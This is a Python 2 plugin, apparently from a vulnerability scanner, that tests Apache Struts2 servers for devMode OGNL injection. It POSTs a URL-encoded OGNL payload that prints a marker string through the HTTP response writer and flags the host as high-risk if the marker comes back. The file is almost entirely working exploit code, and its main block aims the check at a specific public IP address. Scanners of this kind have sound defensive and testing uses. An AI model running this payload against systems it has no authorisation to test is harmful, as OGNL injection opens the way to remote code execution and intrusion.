#!/usr/bin/env python
# encoding: utf-8
from ..t import T
import requests
from termcolor import cprint

class P(T):
    def __init__(self):
        T.__init__(self)
        keywords=['struts']

    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        target_url = ''
        target_url = 'http://' + ip + ':' + port

        if productname.get('path', ''):
            target_url = 'http://' + ip + ':' + port + productname.get('path', '')
        else:
            from script import linktool
            listarray = linktool.getaction(target_url)
            if len(listarray) > 0:
                target_url = listarray[0]
            else:
                target_url = 'http://' + ip + ':' + port + '/login.action'

        result = {}
        timeout=3
        result['result']=False
        res=None
        # debug=browser&object=(#mem=#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?#context[#parameters.rpsobj[0]].getWriter().println(#parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789
        payload = "debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789"

        try:
            headers = {"Content-Type":"application/x-www-form-urlencoded"}
            r = requests.post(target_url,data=payload,headers=headers,timeout=5)
            res_html = r.text

        except Exception,e:
            print e
            return result
        finally:
            if res is not None:
                res.close()
                del res

        if res_html.find("123456789") <> -1:
            cprint(target_url + '存在structsdevmode漏洞', 'red')
            info = target_url + "strutsdevmode  Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='strutsdevmode Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=payload
            result['VerifyInfo']['result'] =info
            result['VerifyInfo']['level'] = '高危(HOLE)'
            return result
        return result

if __name__ == '__main__':
    print P().verify(ip='60.29.241.161',port='80')



